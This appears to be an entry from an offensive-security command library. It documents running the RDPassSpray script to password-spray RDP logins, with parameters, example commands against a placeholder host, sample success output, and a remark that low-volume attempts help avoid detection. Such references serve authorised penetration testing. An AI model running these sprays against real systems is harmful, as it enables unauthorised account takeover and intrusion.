---
type: command
executor: bash
data: 'python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]'
platforms:
  - Linux
tags:
  - credential-access
  - rdp
verified: true
validated: true
---

# run-rdpassspray-script

## Command

```bash
python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
```

## Description

This command executes the RDPassSpray Python script to perform password spraying against an RDP service on a target IP. It supports single credentials or files for usernames/passwords, ideal for low-volume attempts to avoid detection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u [USERNAME] | Single username or path to usernames file | Yes |
| -p [PASSWORD] | Single password or path to passwords file | Yes |
| -d [DOMAIN] | Target domain (for AD environments) | No |
| -t [TARGET IP] | IP address of the RDP target | Yes |

## Examples

### Basic Usage

```bash
python3 RDPassSpray.py -u users.txt -p common.txt -d example.com -t 10.10.10.10
```

### Single Credential Test

```bash
python3 RDPassSpray.py -u administrator -p password123 -d example.com -t 10.10.10.10
```

## Expected Output

[+] Starting RDP Password Spray
[+] Target: 10.10.10.10
[+] Username: administrator | Password: password123 | SUCCESS

## Related

- [[procedures/RDP-Service-Password-Spraying]]
- [[tools/rdpas-sspray]]
